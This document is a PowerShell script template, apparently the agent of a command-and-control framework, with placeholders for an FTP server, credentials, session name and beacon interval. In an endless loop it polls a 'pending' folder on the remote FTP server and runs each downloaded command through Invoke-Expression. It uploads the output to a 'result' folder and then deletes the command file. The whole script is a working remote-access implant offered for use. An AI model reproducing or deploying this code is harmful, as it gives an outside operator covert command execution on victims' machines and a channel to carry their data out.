Function Get-List {{
    Param (
        [System.Uri]$server,
        [string]$username,
        [string]$password,
        [string]$directory
    )

    try
    {{
        $uri = "$server$directory";
        $FTPRequest = [System.Net.FtpWebRequest]::Create($uri);
        $FTPRequest.Credentials = New-Object System.Net.NetworkCredential($username, $password);
        $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails;
        $FTPResponse = $FTPRequest.GetResponse();
        $ResponseStream = $FTPResponse.GetResponseStream();
        $StreamReader = New-Object System.IO.StreamReader $ResponseStream;
        $files = New-Object System.Collections.ArrayList;
        While ($file = $StreamReader.ReadLine())
        {{
            $file = $file.Split(" ", 9, [StringSplitOptions]::RemoveEmptyEntries)[8]
            [void] $files.add("$file")
        }}
    }}
    catch {{
        write-host -message $_.Exception.InnerException.Message;
        exit;
    }}
    $StreamReader.close()
    $ResponseStream.close()
    $FTPResponse.Close()

    Return $files
}}

Function Get-File {{
    Param (
        [System.Uri]$server,
        [string]$username,
        [string]$password,
        [string]$file
    )
    try
    {{
        $uri = "$server$file"
        $FTPRequest = [System.Net.FtpWebRequest]::Create($uri)
        $FTPRequest.Credentials = New-Object System.Net.NetworkCredential($username, $password)
        $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile
        $FTPResponse = $FTPRequest.GetResponse()
        $ResponseStream = $FTPResponse.GetResponseStream()
        $StreamReader = New-Object System.IO.StreamReader $ResponseStream
        $cmd = $StreamReader.ReadLine();
    }}
    catch {{
        write-host -message $_.Exception.InnerException.Message
        exit
    }}
    $StreamReader.close()
    $ResponseStream.close()
    $FTPResponse.Close()

    Return $cmd
}}

Function Write-FTPFile {{
    Param (
        [System.Uri]$server,
        [string]$username,
        [string]$password,
        [string]$dstfile,
        [string]$data
    )

    try
    {{
        $uri = "$server$dstfile"
        $FTPRequest = [System.Net.FtpWebRequest]::Create($uri)
        $FTPRequest.Credentials = New-Object System.Net.NetworkCredential($username, $password)
        $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::AppendFile
        $EncData = [System.Text.Encoding]::UTF8.GetBytes($data);
        $RequestStream = $FTPRequest.GetRequestStream()
        $RequestStream.Write($EncData, 0, $EncData.Length)
    }}
    catch {{
        write-host -message $_.Exception.InnerException.Message
        exit
    }}
    $RequestStream.close()
}}

Function Del-FTPFile {{
    Param (
        [System.Uri]$server,
        [string]$username,
        [string]$password,
        [string]$dstfile
    )

    try
    {{
        $uri = "$server$dstfile"
        $FTPRequest = [System.Net.FtpWebRequest]::Create($uri)
        $FTPRequest.Credentials = New-Object System.Net.NetworkCredential($username, $password)
        $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
        $FTPRequest.GetResponse() | Out-Null
    }}
    catch {{
        write-host -message $_.Exception.InnerException.Message
        exit
    }}
}}


$server = '{server}'
$username = '{username}'
$password = '{password}'
$base = '/{session}'
$beacon = {beacon}

while ($true) {{
    Start-Sleep $beacon
    $filelist = Get-List -server $server -username $username -password $password -directory "$base/pending"
    foreach($file in $filelist) {{
        $cmd = Get-File -server $server -username $username -password $password -file "$base/pending/$file"
        $output = Invoke-Expression "$cmd"
        Write-FTPFile -server $server -username $username -password $password -dstfile "$base/result/$file" -data "$output"
        Del-FTPFile -server $server -username $username -password $password -dstfile "$base/pending/$file"
        Start-Sleep $beacon
    }}
}}
